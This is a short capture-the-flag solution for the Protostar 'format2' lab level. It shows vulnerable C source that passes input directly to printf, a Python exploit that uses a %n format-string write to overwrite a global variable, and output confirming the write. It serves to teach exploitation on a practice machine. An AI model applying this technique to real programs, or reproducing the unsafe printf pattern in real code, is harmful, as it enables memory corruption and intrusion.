Source:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

Here is the exploit script (saved as `format2.exp.py`):
```python
import struct
targaddr=0x80496e4
tas = struct.pack('<I', targaddr)
exp = ""
exp += tas
exp += '%60x'
exp += '%4$n' # I figured out that our string starts at 4 words

print exp
```

Sample output:
```bash
user@protostar:/opt/protostar/bin$ python ~/format2.exp.py | ./format2
�                                                         200
you have modified the target :)
```
